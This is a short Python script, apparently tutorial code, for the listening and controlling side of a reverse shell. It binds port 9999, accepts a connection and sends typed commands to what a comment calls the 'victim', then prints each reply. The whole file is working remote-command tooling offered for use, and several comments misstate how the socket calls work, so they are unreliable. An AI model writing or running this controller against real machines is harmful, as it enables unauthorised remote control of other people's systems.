
import socket
import sys


#to craete a socket(connect two computers)
def create_socket():
    try:
        global host
        global port 
        global s #socket
        host = ""
        port = 9999
        s = socket.socket()#socket created
    except socket.error as msg:
        print("socket creation error"+str(msg))
    
    
# binding the socket and listening for coonections
def bind_socket():
    try:
        global host
        global port 
        global s
        print("Binding the ports "+ str(port))
        
        s.bind((host,port))
        s.listen(5) #listen listen for the connection that can be made 
        #5 is number of time it will tolerate bad connection before throwing error
        
    except socket.error as msg:
        print("socket binding error"+ str(msg)+"\n"+"Retrying...")
        bind_socket()
        

#establish connection with a client (socket must be listening)
        
def socket_accept():
    conn, address = s.accept()
    print("connection has been established |"+"IP"+address[0]+" |Port"+str(address[1]))
    send_commands(conn)
    conn.close()

#commands to victim    
def send_commands(conn):
    while True:
        cmd = input()
        if cmd == "quit":
            conn.close()
            s.close()
            sys.exit()
            
        if len(str.encode(cmd))>0:
            conn.send(str.encode(cmd))
            client_response = str(conn.recv(1024),"utf-8")#when we send or recieve byte it always send in chunks. here our chunk will use 1024 bits
            print(client_response, end="")
            
            
def main():
    create_socket()
    bind_socket()
    socket_accept()

main()            

        
        
 
        
    
    
